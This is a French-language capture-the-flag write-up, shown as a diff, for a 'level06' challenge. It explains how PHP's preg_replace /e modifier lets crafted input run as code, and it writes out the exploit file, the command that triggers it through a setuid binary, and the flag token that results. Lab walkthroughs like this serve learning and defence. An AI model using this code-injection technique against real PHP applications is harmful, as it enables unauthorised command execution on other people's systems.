@@ -1,0 +1,55 @@
+#ls -la
+-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
+
+#./level06
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+#nm -u level06
+         w _Jv_RegisterClasses
+         w __gmon_start__
+         U __libc_start_main@@GLIBC_2.0
+         U execve@@GLIBC_2.0
+         U free@@GLIBC_2.0
+         U getegid@@GLIBC_2.0
+         U geteuid@@GLIBC_2.0
+         U setresgid@@GLIBC_2.0
+         U setresuid@@GLIBC_2.0
+         U strdup@@GLIBC_2.0
+
+- On voit que level06 appel le script php probablement via execve, il semble qu'il necessite un file a lire via la fonction file_get_contents() 
+
+#cat level06.php
+#!/usr/bin/php
+<?php
+$r = x($argv[1], $argv[2]); print $r;
+
+function x($y, $z) {
+	$a = file_get_contents($y); 
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+	$a = preg_replace("/\[/", "(", $a); 
+	$a = preg_replace("/\]/", ")", $a); 
+	return $a; }
+
+function y($m) { 
+	$m = preg_replace("/\./", " x ", $m); 
+	$m = preg_replace("/@/", " y", $m); 
+	return $m; 
+}
+?>
+
+
+- $r = x($argv[1], $argv[2]); print $r;  : le script prend deux arguments auquell il applique lq fonction x
+- la fonction x : 
+- $a = file_get_contents($y);  : lit le contenu de argv[1] puis applique a son contenu des changement a l'aide de preg_replace 
+
+- $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);  : preg_replace(patternARechercher, Remplacement, variableContenantLesChainesARemplacer). Le pattern coutient deux sous groupes (.*) n'importe quelle suite de carateres, contenu lui meme dans le premier groupe [x (deuxiemeGroupe)], on recherche donc [x (expression)]. Dans le remplacement \2 signifie le deuxieme groupe. Le pattern sera donc remplace par y("expression")
+
+- le flag /e permet devaluer/executer une expression apres remplacement. Ce flag constitue une faille de securite car nous pouvons inserer un expression a executer : ici getflag
+
+#echo "[x {$z(getflag)}]" > file
+Nous creons le fichier afin quil corresponde a ce que l'on souhaite executer lors de l'appel a preg_replace y("shell_exec(getflag)")
+
+#./level06 file 'shell_exec'
+Check flag x Here is your token : wiok45aaoguiboiki2tuin6ub
+
